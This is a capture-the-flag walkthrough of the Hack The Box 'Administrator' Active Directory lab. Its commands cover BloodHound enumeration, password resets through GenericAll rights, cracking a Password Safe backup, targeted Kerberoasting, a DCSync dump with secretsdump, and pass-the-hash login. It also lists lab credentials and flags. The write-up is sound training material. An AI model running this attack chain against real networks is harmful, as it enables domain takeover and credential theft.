# Intianal Enumeration

**Full port scan**

As always I start off with a port scan. first a full port scan followed by a detailed targetted port scan.

```
nmap 10.129.59.66
```

Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2025-01-20 13:10 CST  
Nmap scan report for 10.129.59.66  
Host is up (0.010s latency).  
Not shown: 988 closed tcp ports (reset)  
PORT STATE SERVICE  
21/tcp open ftp  
53/tcp open domain  
88/tcp open kerberos-sec  
135/tcp open msrpc  
139/tcp open netbios-ssn  
389/tcp open ldap  
445/tcp open microsoft-ds  
464/tcp open kpasswd5  
593/tcp open http-rpc-epmap  
636/tcp open ldapssl  
3268/tcp open globalcatLDAP  
3269/tcp open globalcatLDAPssl

**Detailed port scan**

```
nmap -p21,53,88,135,139,389,445,464,593,636,3268,3269 -sCV 10.129.59.66
```

PORT STATE SERVICE VERSION  
21/tcp open ftp Microsoft ftpd  
| ftp-syst:  
|_ SYST: Windows_NT  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-21 02:11:19Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)  
3269/tcp open tcpwrapped  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
|_clock-skew: 7h00m00s_  
_| smb2-time:_  
_| date: 2025-01-21T02:11:21_  
_|_ start_date: N/A

From the scan we can see that it is an AD machine

I made a connection to the windows machine with the user we already got in the beginning: username “olivia” & password “ichliebedich”

![image-20250120-212919.png](85590054.png)

because I have now seen that I could log in with this user on the windows machine, I can go get all the data from the domain controllers. This by doing the following command:

```
nxc ldap 10.129.59.66 -u olivia -p ichliebedich --bloodhound --collection All --dns-server 10.129.59.66
```

![image-20250120-213136.png](85491754.png)

Now if we set up bloodhound and start uploading the data there we can start seeing which path we can start abusing for user Michael to become.

![image-20250120-213413.png](85557279.png)

We see that we have genericall rights on michael and so we can change the password of the user.

So I went into the connection with the windows machine to change the user michael's password. this by executing the following command.

```
net user michael Testing123
```

![image-20250120-213653.png](85491762.png)

We can see above that we were able to change the password properly.

If we go back to look at bloodhound we can see the following:

![image-20250120-213909.png](85557287.png)

We see that the user michael can go and change benjamin's password. So for this I will go log in to the windows connection with michael's user credentials.

```
evil-winrm -u 'michael' -p 'Testing123' -i 10.129.59.66
```

![image-20250120-214117.png](85590067.png)

I went to change the password of the user benjamin by executing the following commands.

We will first upload the module powerview.ps1 on the machine by executing the following command.

```
upload ./PowerView.ps1
```

![image-20250120-214503.png](85557301.png)

We will start importing the module by executing the following code.

```
Import-Module ./PowerView.ps1
```

![[Pasted image 20250122142310.png]]

We will put the password we want to use for changing the benjamin into a variable. This is done by executing the following command.

```
$cred = ConvertTo-SecureString "Password123!" -AsPlainText -force
```

![[Pasted image 20250122142247.png]]

With the “Set-DomainUserPassword” command we will be able to start changing the user's password.

```
Set-DomainUserPassword -identity benjamin -accountpassword $cred
```

![[Pasted image 20250122142227.png]]

Now that the we have benjamin's password we can go log in to the ftp server.

![image-20250120-215237.png](85590092.png)

There we can see that there is a Backup.psafe3 file. We will start downloading it using the following command:

```
get Backup.psafe3
```

![image-20250120-215412.png](85590099.png)

I am going to make a hash of this file first so that I can start using the password that is on this file to log in so that I can see what is in the file. I am going to do this using the following command:

```
pwsafe2john Backup.psafe3
```

![image-20250120-211729.png](85491739.png)

This outcome then put to a file so this is then easier to pre-crack with john.

```
pwsafe2john Backup.psafe3 > hash
```

![image-20250120-211822.png](85590027.png)

Going to crack password with john using the following command:

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
```

![image-20250120-211905.png](85557263.png)

### PasswordSafe

pwsafe is a tool for securely managing and storing passwords and other sensitive information, so we will have to download passwordsafe and open the Backup.psafe3 file. We can do this by executing the following command:

pwsafe Backup.psafe3

![image-20250120-211538.png](85491732.png)

So with the password we cracked above, we can now start logging into the password safe.

![image-20250120-211959.png](85590034.png)

As you can see below I have put all the passwords and all the usernames that could be found in the password safe in a separate notepad file. I will now try logging in to the windows machine using the evil-winrm command:

```
evil-winrm -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -i 10.129.59.66
```

![image-20250120-212257.png](85590043.png)

as you are going to be able to see below I have now been able to obtain a shell with the windows machine.

So now we have found the user flag.

user flag: 4ecdfc859c886951ec7fdb9d2d695fff

![image-20250120-212521.png](85557270.png)

## Kerberoasting-attack

I will perform a targeted Kerberoasting attack against a domain controller in the domain Administrator.htb. It uses the specified user account emily and her password UXLCI5iETUsIBoFVTj8yQFKoHjXmb to access the domain controller at IP address 10.129.59.66.

**What exactly is it going to do?**

- Authentication:
    

-u “emily” and -p “UXLCI5iETUsIBoFVTj8yQFKoHjXmb” provide the user emily's login credentials. The tool uses these to log in to the Administrator.htb domain.

- Target:
    

-d “Administrator.htb” specifies the Active Directory domain on which the attack is carried out.

--dc-ip 10.129.59.66 specifies the IP address of the target domain controller (Domain Controller, DC).

- Kerberoasting attack:
    

The tool performs a Kerberoast attack, targeting service accounts in Active Directory that have a Service Principal Name (SPN). These are accounts often associated with services such as SQL, IIS or custom applications. The attack works as follows:

The tool requests a Kerberos service ticket (TGS) for a specific service using the specified account.

The obtained ticket is stored as it is cryptographically encrypted with the NTLM hash of the service account.

The attacker can crack this ticket offline to retrieve the NTLM hash of the service account.

```
python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.129.59.66
```

![[Pasted image 20250122142138.png]]

We will now get the following error

[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

we will be able to avoid this problem with the following command:

```
sudo ntpdate administrator.htb
```

and now if we will run the command then we will start to get the hash for the user ethan.

![image-20250120-230353.png](85786632.png)

I went to put these in a separate file and started trying to crack it with john. this by running the following command.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
```

## Active Directory Credential Dumping

This command is to use the Impacket tool secretsdump.py to extract sensitive data (such as password hashes, user credentials and other authentication information) from a Windows system, specifically a domain controller, so that I can then start abusing this hash for logging in as the administrator.

```
impacket-secretsdump "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
```

![image-20250121-084843.png](85786651.png)

As you can see in the picture above, I put a red frame there. Inside this frame is the hash that we will use to log in as administrator.

ROOT

so now we are going to start logging into the admin account by the hash we just obtained.

```
evil-winrm -i administrator.htb -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"
```

![image-20250120-230959.png](85819402.png)

As we navigate now to the desktop folder within the root user will we see there te root flag.

root flag: dee8add3e7f9ef3e9e0e7f9439eb6836

![image-20250120-231053.png](85786641.png)

ROOTED

![image-20250120-231112.png](85819408.png)
